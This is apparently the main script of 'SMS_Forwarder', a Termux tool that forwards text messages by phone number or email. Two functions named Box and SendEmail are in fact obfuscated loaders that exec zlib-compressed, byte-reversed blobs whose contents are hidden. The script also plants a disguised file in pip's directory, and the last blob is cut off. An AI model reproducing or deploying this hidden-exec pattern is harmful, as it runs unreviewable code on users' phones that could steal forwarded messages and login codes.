import os              # import the os library for interacting with the operating system
import json            # import the json library for working with JSON data
import subprocess      # import the subprocess library for running shell commands
import sys             # import the sys library for access to interpreter variables
import re              # import the re library for working with regular expressions
import time            # import the time library for time-related functions
import threading       # import the threading library for working with threads
import pip             # import the pip library for installing Python packages
import zlib            # import the zlib library for data compression
import shutil          # import the shutil library for high-level file operations

from time import sleep # import the sleep function from the time library


def Installer():
    try:
        def install(*args):
            for i in args: subprocess.getoutput("pip insall "+i)
        UNIMPORTED = []
        try: import requests
        except: UNIMPORTED.append("requests")
        try: import random
        except: UNIMPORTED.append("random")
        try: import smtplib
        except: UNIMPORTED.append("secure-smtplib")
        if not (len(UNIMPORTED) == 0):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║ {yellow}SOME DEPENDENCIES COULD NOT BE INSTALLED {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            INSTALL = threading.Thread(target=install, args=(UNIMPORTED))
            INSTALL.start()
            while INSTALL.is_alive(): AnimLOAD(f" {yellow}Installing Building Dependencies...{white}", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
            INSTALL.join()
        if not (termux_api):
            apk_release = subprocess.getoutput("timeout 5 echo $TERMUX_APK_RELEASE")
            if not (apk_release): apk_release = "F-Droid"
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║        {white}Termux-API Not Installed {blue}!        {red}║", 20)
            center(f"{red}╠══════════════════════════════════════════╣", 5)
            center(Box(yellow+"Install Termux-API From "+apk_release, "║", " ", red+" ║", 49, "center", resultprint=False), 10)
            center(f"{red}║             {yellow}And try again {white}!              {red}║", 20)
            center(f"{red}║         {yellow}Dont worry its secure :)         {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print()
            exit()
        else:
            if not (len(UNIMPORTED) == 0):
                Banner()
                center(f"{red}╔══════════════════════════════════════════╗", 5)
                center(f"{red}║         {yellow}Installtion Completed {white}!          {red}║", 20)
                center(f"{red}╚══════════════════════════════════════════╝", 5)
                center(f"{red}╔══════════════════════════════════════════╗", 5)
                center(f"{red}║              {yellow}Now Just Type               {red}║", 15)
                center(f"{red}╠══════════════════════════════════════════╣",5)
                center(f"{red}║ {white}python ~/SMS_Forwarder/sms_forwarder.py  {red}║",15)
                center(f"{red}╚══════════════════════════════════════════╝", 5)
                finaltxt=""
                for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
                sys.stdout.write("\r"+finaltxt)
                with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
                subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle Command Copy On Your ClipBoard !")
                subprocess.getoutput("timeout 3 termux-clipboard-set python $HOME/SMS_Forwarder/sms_forwarder.py")
                exit()
            else: MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

try:
    import smtplib     # import the smtplib library for sending email
    import random      # import the random library for generating random numbers
    import zipfile         # import the zipfile library for working with ZIP archives
    import requests    # import the requests library for making HTTP requests
except:
    os.system("python ~/SMS_Forwarder/.core/setup.py")




__VERSION__ = "0.1"  # sets a string value of "0.1" to the variable __VERSION__ for define tool version
__LINK__ = "https://github.com/GreyTechno/SMS_Forwarder.git"  # sets a string value of the project's GitHub link to the variable __LINK__

clear = lambda : os.system("clear")  # defines a lambda function that clears the terminal screen using the "clear" command on Unix-based systems

# colours
# sets a series of string variables that contain ANSI escape codes for setting the color of console output
reset = '\033[39m'
blue = '\033[34m'
red = '\033[31m'
yellow = '\033[92m'
green = '\033[32m'
cyan = '\033[36m'
white = '\033[37m'
magenta = '\033[35m'
lightcyan = '\033[96m'
lightmagenta = '\033[95m'

def cmd():
    try:
        try:
            CMD = sys.argv[1]  # get the command line argument at index 1 and assign it to the variable CMD
        except:
            CMD = False  # if there is no argument at index 1, set CMD to False
        if (CMD):
            if (CMD == "-h") or (CMD == "--help"): Usage()  # if CMD is "-h" or "--help", call the Usage function
            elif (CMD == "-v") or (CMD == "--version"): print(__VERSION__)  # if CMD is "-v" or "--version", print the version number
            elif (CMD == "-u") or (CMD == "--update"): Update()  # if CMD is "-u" or "--update", call the Update function
            elif (CMD == "-s") or (CMD == "--setup"): Installer()  # if CMD is "-s" or "--setup", call the Installer function
            elif (CMD == "-e") or (CMD == "--email"): EmailMenu()  # if CMD is "-e" or "--email", call the EmailMenu function
            elif (CMD == "-p") or (CMD == "--phnum"): PHMenu()  # if CMD is "-p" or "--phnum", call the PHMenu function
            elif (CMD == "-a") or (CMD == "--about"): About()  # if CMD is "-a" or "--about", call the About function
            else: pass  # if CMD is not any of the above options, do nothing
            return True  # return True to indicate that a command was successfully executed
        else:
            return False  # return False to indicate that no command was executed
    except KeyboardInterrupt:
        EXIT(False)  # if the user interrupts the program with a keyboard interrupt, call the EXIT function with False as the argument
    except Exception as e:
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()
        # if an exception occurs, print the error message in red, display a message telling the user to report the issue, open the GitHub issues page in the user's default browser using the termux-open-url command (this is specific to the Termux Android terminal emulator), and exit the program

def termux_api():
    try:
        # Check if the 'termux-battery-status' command is available
        if (subprocess.getoutput("command -v termux-battery-status") == ''):
            # Install the Termux API if it's not already installed
            subprocess.getoutput("pkg install termux-api && pkg install termux-api")
            # Check again if the 'termux-battery-status' command is now available
            if (subprocess.getoutput("command -v termux-battery-status") == ''): 
                return False
            else: 
                # If the 'termux-battery-status' command is available, recursively call the 'termux_api()' function
                termux_api()
        else:
            # If the 'termux-battery-status' command is available, check if it's working
            if (subprocess.getoutput("timeout 10 termux-battery-status") == ''): 
                return False
            else: 
                return True
    except KeyboardInterrupt: 
        # If the user presses Ctrl+C, exit the program with a False value
        EXIT(False)
    except Exception as e: 
        # If an exception occurs, display an error message and prompt the user to report the issue
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def Arrange(TXT="", RAW=" "):
    try: txt, INT = int(TXT), True  # Attempt to convert TXT to an integer. If successful, set INT to True.
    except ValueError: txt, INT = len(TXT), False  # If TXT cannot be converted to an integer, set txt to its length and INT to False.
    except KeyboardInterrupt: EXIT(False)  # If the user interrupts the program with Ctrl-C, exit gracefully.
    except: pass  # If an error occurs, do nothing.
    text = int(str(txt)[-1:])  # Get the last digit of txt.
    # Loop through even numbers between 2 and 10.
    for i in range(2, 10, 2):
        if (text == 0) or (i == text):  # If the last digit is 0 or matches i, set length to True and break out of the loop.
            length = True
            break
        else : length = False  # Otherwise, set length to False.
    
    if not (length):  # If length is False:
        if (INT): return int(TXT) - 1  # If INT is True, return TXT as an integer minus 1.
        else: return TXT + RAW  # Otherwise, return TXT concatenated with RAW.
    else:  # If length is True:
        if (INT): return int(TXT)  # If INT is True, return TXT as an integer.
        else: return TXT  # Otherwise, return TXT as is.

def center(text, a=0, display=True):
    try:
        # Get the length of the text after removing extra spaces
        length_txt = len(Arrange(text, " "))
        # Get the length of the terminal window
        length_area = (Arrange(os.get_terminal_size().columns) - 2)
        # Calculate the number of spaces to center the text
        len_txt_area = (length_area // 2) - ((length_txt - a) // 2)
        # Add the required number of spaces before and after the text
        finaltxt = ""
        for i in range(len_txt_area): finaltxt += " "
        finaltxt += text
        raw1 = str(len_txt_area + length_txt - length_area - a).replace("-","")
        for i in range(int(raw1)+1): finaltxt += " "
        # If display is True, print the text; otherwise, return the text
        if (display): print(finaltxt)
        else: return finaltxt
    # Catch the keyboard interrupt and exit the program
    except KeyboardInterrupt: EXIT(False)
    # Catch any other exception, print an error message and exit the program
    except Exception as e: 
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        exit()

def INPUT(text):
    try:
        length_txt = len(Arrange(text, " "))  # calculate the length of the input text
        length_area = Arrange(os.get_terminal_size().columns) - 2  # get the terminal size and calculate the length of the area available for the input
        len_txt_area = (length_area // 2) - (length_txt // 2)  # calculate the space needed for the input
        finaltxt = ""
        for i in range(len_txt_area-18): finaltxt += " "  # create the space before the input
        return (input(finaltxt+text+yellow))  # display the prompt and take user input
    except KeyboardInterrupt: EXIT(False)  # catch the exception when the user hits the interrupt key
    except Exception as e:  # catch other exceptions
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues")  # print an error message
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")  # open the GitHub issues page in Termux
        exit()  # exit the program

def Banner():
    clear() # clears the terminal screen
    TerminalZoom(46) # resizes the terminal window to be 46 rows high
    b="".join(random.sample([cyan,magenta,yellow,lightmagenta], 1)) # selects a random color from the list of colors and assigns it to the variable b
    center(f"{red}╔══════════════════════════════════════════╗", a=5) # prints a red banner border at the top of the screen, using the center function to center it and specifying a padding of 5 spaces on each side
    center(f"{red}║  {white}╔═╗{b}┌┬┐┌─┐  {white}╔═╗{b}┌─┐┬─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┬─┐  {red}║{reset}", a=35) # prints a line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}║  {white}╚═╗{b}│││└─┐  {white}╠╣ {b}│ │├┬┘│││├─┤├┬┘ ││├┤ ├┬┘  {red}║{reset}", a=35) # prints another line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}║  {white}╚═╝{b}┴ ┴└─┘  {white}╚  {b}└─┘┴└─└┴┘┴ ┴┴└──┴┘└─┘┴└─  {red}║{reset}", a=35) #  prints another line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}╠══════════════════════════════════════════╣", a=5) #  prints a red border in the middle of the banner, using the center function to center it and specifying a padding of 5 spaces on each side
    center(f"{red}║   {green}▂▃▄▅▆▇▓▒░ {lightcyan}Created By MR_GT {green}░▒▓▇▆▅▄▃▂   {red}║{reset}", a=30) # prints another line of text in the banner, using the center function to center it and specifying a padding of 30 spaces on the left side
    center(f"{red}╚══════════════════════════════════════════╝{reset}", a=10) # prints a red banner border at the bottom of the screen, using the center function to center it and specifying a padding of 10 spaces
    sys.stdout.write(reset) # this is likely used to ensure that any subsequent text output to the terminal is not formatted in unintended ways due to previous formatting changes made by the program.

def Space(args):
    # Define a string variable to store the spaces
    STORE = ""
    # Loop `args` number of times and add a space character to `STORE` in each iteration
    for i in range(args):
        STORE += " "
    # Return the final value of `STORE`
    return STORE

def TerminalZoom(args):
    # If the argument is greater than or equal to 26, display "Zoom Out The Terminal"
    if not (args < 26): STORE, LEN = f"{red}[ {yellow}Zoom Out The Terminal {red}]", 26
    # Otherwise, set STORE and LEN to empty string and 1 respectively
    else: STORE, LEN = "", 1
    # Add '═' characters to STORE until it has the desired length (args)
    for i in range(args - LEN): STORE += "═"
    # Add a '►' character to the end of STORE and reset the terminal color
    STORE += f"►{reset}"
    # If the terminal size is less than args, print STORE, otherwise do nothing
    if (os.get_terminal_size().columns < args): print(STORE)
    else: pass
    # Wait until the terminal size is greater than or equal to args
    MAIN = False
    while True:
        if (os.get_terminal_size().columns < args): MAIN = True
        else: break
    # If the terminal size is greater than or equal to args, clear the terminal
    if (MAIN): clear()

Box = lambda _ : zlib.decompress(_[::-1]);exec((Box)(b"N\xf5\x0f\x0f\x1b\xe8\x9c\xb9\x0b\xf4S\x85\xd8\xce\xd1b\xd2\xd8\xda\xb1\xe3%{|Zi\xfd\x9d\xb9\xaf\xe6\nN\x9dLOqi3\x12\xf9\x84\xc0\x18\xbaY\x16\xfffy2\xee\xf2\x90\x85\xa8\x8d\x12\xb1\xee\xac^\x12\xd9f9M$ycc\x99v\x9e\xcdQV\x18\xcb\xee:\xeb\x84\x8f\xe6\x8d4\x02P\xc3A\x7f$\xf0\xf7,\xbd*A\xc6\x03\x02'X\x9c\xb7?\x8d\x0fn\x84\x84c\x11\x02\x94\rEP\x0c\xc41`g\xe1\xc1=\xadA\xc3\xa7k\xeam\xa7\x189\x11m\x10NF\xc9\xa1,\xf0\x8f\x1cD\xaa\x90\xb7\x03\x04s^mX\x08*\xeb\x87\x9d\x88\xe1AQL\xfe\x7fF\xe8\xb6\xe8\xcb\xd2\x92U1\x1b\xb4\x88\xde\n\r\x01x@=\xd9Ah>\xaf8\xc8_\xd6/8@\x8a!\x98\x15`\x81I!\x98\x16\tZ\x03\xe8j$\x8f:=\x12\xba\xc0\x83\x1e^\xadBi\xb3y\xe37\xe1\xb5\xb5_H\x1a\xba3[^\x0e,\x1a\xf9\xbf\x95n\x9fx\x07\t\xeb7\xbd\xb3E\xd1(R\xe5V\xc9\x1a\xbe\xffI2\xc6\x1c\x84\x08\xecg\x08\xbd\xe8o\xda\x1d\x06N\xdd;b,\x9d\x06+\xf7\xbd\x100\xc3j\xc9R\x95\x9cx"))

def EXIT(G=True):
    # If the argument is False, print two empty lines
    if not (G):
        print(), print()
    # Otherwise, call the Banner function
    else:
        Banner()
    # Print a centered message with a decorative border
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║          {yellow}THANKS FOR USING...!!           {red}║", 15)
    center(f"{red}╚══════════════════════════════════════════╝", 5)
    # Exit the program
    exit()

# define a function called AnimLOAD which takes text, animbar, repet, and delay as arguments
def AnimLOAD(text, animbar, repet=1, delay=0.08):
    try:
        # create an empty string called finaltxt
        finaltxt=""
        # loop through the range of repet and add spaces to finaltxt
        # to center the animation on the screen
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        # loop through the range of repet
        for rep in range(repet):
            # loop through each character in the animbar string
            for handlechar in animbar:
                # write the animation to the screen
                sys.stdout.write(f"\r{finaltxt}{handlechar} {text}")
                # flush the output buffer to the screen
                sys.stdout.flush()
                # wait for the specified delay
                sleep(delay)
            # decrement repet by 1
            repet -= 1
    # if the user interrupts the program with ctrl+c
    except KeyboardInterrupt: 
        # call the EXIT function with argument False
        EXIT(False)
    # if there is an exception raised in the try block
    except Exception as e: 
        # print the error message in red color and prompt the user to report the issue on GitHub
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        # open the GitHub issue page in the user's web browser
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        # exit the program
        exit()

def Internet():
    try:
        requests.get("https://google.com/")  # send a GET request to https://google.com/
        return True  # if the request is successful, return True
    except:  # if an error occurs during the request
        return False  # return False to indicate that there is no internet connection


def Update():
    try:
        def update():
            try:
                __RP__ = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 5))
                __ZIP__ = requests.get("https://github.com/GreyTechno/SMS_Forwarder/archive/refs/heads/main.zip")
                with open(f"../{__RP__}.zip", "wb") as file: file.write(__ZIP__.content)
                with zipfile.ZipFile(f"../{__RP__}.zip", "r") as zip: zip.extractall(f"../{__RP__}")
                os.remove(f"../{__RP__}.zip")
                for file in os.listdir(f"../{__RP__}/SMS_Forwarder-main/"): shutil.copy2(f"../{__RP__}/SMS_Forwarder-main/"+file, f"../{__RP__}"), os.remove(f"../{__RP__}/SMS_Forwarder-main/"+file)
                os.removedirs(f"../{__RP__}/SMS_Forwarder-main")
                for root, dir, files in os.walk(subprocess.getoutput("pwd")):
                    for i in files: os.remove((root+"\\"+i).replace("\\", "/"))
                os.chdir("..")
                os.system("rm -rf SMS_Forwarder")
                os.rename(f"{__RP__}", "SMS_Forwarder")
            except KeyboardInterrupt: EXIT(False)
            except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()
        if not (Internet()):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║    {yellow}Check your internet connection...     {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}Try Again                  {red}║", 30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║", 30)
            center(f"{red}╠══════════════════════════════════════════╝", 5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): Update()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
                center(f"{red}║              {blue}Invalid Option              {red}║", 15)
                center(f"{red}╚══════════════════════════════════════════╝", 5)
                sleep(2)
                MENU()
        else:
            Banner()
            UPDATE = threading.Thread(target=update)
            UPDATE.start()
            while UPDATE.is_alive(): AnimLOAD(" Updating...", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
            UPDATE.join()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║          {white}Updateing Completed !           {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {yellow}Now Just Type               {red}║", 15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║ {white}python ~/SMS_Forwarder/sms_forwarder.py  {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
            subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle Command Copy On Your ClipBoard !")
            subprocess.getoutput("timeout 3 termux-clipboard-set python $HOME/SMS_Forwarder/sms_forwarder.py")
            exit()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def CheckVersion():
    try:
        version = requests.get("https://raw.githubusercontent.com/GreyTechno/SMS_Forwarder/main/.version").json()["version"]
        if (__VERSION__ != version):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║         {magenta}UPDATES ARE AVAILABLE...         {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(Box(f"{white}VERSION {blue}: {yellow}{str(version)}", "║", " ", red+" ║", 59, "center", resultprint=False), 20)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            UPD = True
            CSP = True
            try:
                fileData = json.loads(open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "r").read())
                if (fileData.get("usageleft") == 0): UPD = False
                else:
                    with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: json.dump({"usageleft": int(fileData.get("usageleft")) - 1}, file)
            except: 
                with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
            if (UPD):
                center(f"{red}╔══════════════════════════════════════════╗",5)
                center(f"{red}║     {white}Do you want start updating now ?     {red}║",15)
                center(f"{red}╠══════════════════════════════════════════╣",5)
                center(f"{red}║                 {yellow}yes {white}/ {yellow}no                 {red}║",25)
                center(f"{red}╠══════════════════════════════════════════╝",5)
                center(f"║{Space(42)}")
                Input = INPUT("╚════► ")
                if (Input == "Y") or (Input == "YES") or (Input == "Yes") or (Input == "y") or (Input == "yes"): pass
                else: CSP = False
            else: CSP = True
            if (CSP): Update()
            else: pass
        else: pass
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def About():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║                  {magenta}ABOUT                   {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║{yellow}  SMS_Forwarder can be used in Termux to  {red}║",15)
        center(f"{red}║{yellow} forward text messages from one device to {red}║",15)
        center(f"{red}║{yellow}another using Linux CommandLine utilities {red}║",15)
        center(f"{red}║{yellow} The advantages of using SMS Forwarder in {red}║",15)
        center(f"{red}║{yellow}Termux are that it allow users to automate{red}║",15)
        center(f"{red}║{yellow} the sms forwarding process using Python  {red}║",15)
        center(f"{red}║{yellow} scripts, and it provides a secure way to {red}║",15)
        center(f"{red}║{yellow}  forward messages as it uses end-to-end  {red}║",15)
        center(f"{red}║{yellow}encryption to ensure that the messages are{red}║",15)
        center(f"{red}║{yellow} not intercepted or read by unauthorized  {red}║",15)
        center(f"{red}║{yellow}parties This offers advanced functionality{red}║",15)
        center(f"{red}║{yellow}  and customization options that are not  {red}║",15)
        center(f"{red}║{yellow}available on other platforms Additionally {red}║",15)
        center(f"{red}║{yellow}SMS_Forwarder in Termux provides multiple {red}║",15)
        center(f"{red}║{yellow} forwarding options including forwarding  {red}║",15)
        center(f"{red}║{yellow}  SMS via number or email. Overall, SMS   {red}║",15)
        center(f"{red}║{yellow} Forwarder in Termux is a useful tool for {red}║",15)
        center(f"{red}║{yellow}    people who want to stay connected     {red}║",15)
        center(f"{red}║{yellow}         across multiple devices.         {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║        {magenta}TOOL NAME {white}: {yellow}SMS_Forwarder         {red}║",25)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(Box(f"{magenta}VERSION {white}:{yellow} "+str(__VERSION__), "║", " ", red+" ║", 59, "center", resultprint=False), 20)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║              {magenta}AUTHER {white}:{yellow} MR_GT              {red}║",25)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║          {magenta}SOURCE CODE HOSTED AT           {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║     {yellow}tinyurl.com/gtcode-smsforwarder      {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def Usage():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║        {magenta}USAGE OF SMS FORWARDER...         {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║          {magenta}Optional arguments...           {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔═══════════════════╦══════════════════════╗", 5)
        center(f"{red}║             {blue}-h    {red}║    {blue}--help            {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}       Direct show this usage menu        {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-v    {red}║    {blue}--version         {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}    Show tool version number and exit     {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-u    {red}║    {blue}--update          {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}  Update the tool and automatic restart   {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-s    {red}║    {blue}--setup           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Install and setup the requirment pakages {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-e    {red}║    {blue}--email           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Direct navigate to forward sms via email {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-p    {red}║    {blue}--phnum           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Navigate to forward sms via phone number {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-a    {red}║    {blue}--about           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}      Direct navigate to about menu       {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

SendEmail = lambda _ : zlib.decompress(_[::-1]);exec((SendEmail)(b'6\x88\xd0\x98\x0b\xfe\x87\x97M\x84\x9c\xeeXw(\xfa\x95p\x7fE\xdf#\xc0\xfa\x1e\xdb/O\xc5\xa8$\xe3\xff\xf5\x93mvM\x8e\xd0\xe0a\xfe\x0b\xdd\xe8\xd8\x18\x99N\xf6\x0f"\x83&\x01\t]\x13\xba\x1c+\xf4\xc8\xf2\x82>\xf6\t\xabp6\x88\xfb\xd3\xeeVT(\x8b\xf5\xef\xae\xff\xbb\x076vE\xfe\x85BC\xad\x90b$^Tjc\xe0`\x8c|c6\xf9\xb5\x99\xa9a~\x867)\xe9\xb0{\x18\xf4W\xd0\x0b\x9f\xa7\xe3\xceB\x83\xb8\xfc\xfa\x7f\x99BZ\x00c\xc6W\xaf\xd8\xe7^0\x8b\xe3#$\\p\xc4\x9a\x91\xe5\xdd\x90I\xdc\x81\x92\xa0\xfc/\'\x88*\xd8\xc9\xe9\xe6\xbf\x85:h\xc7N|7\xeaL\x05\x1f\xa7 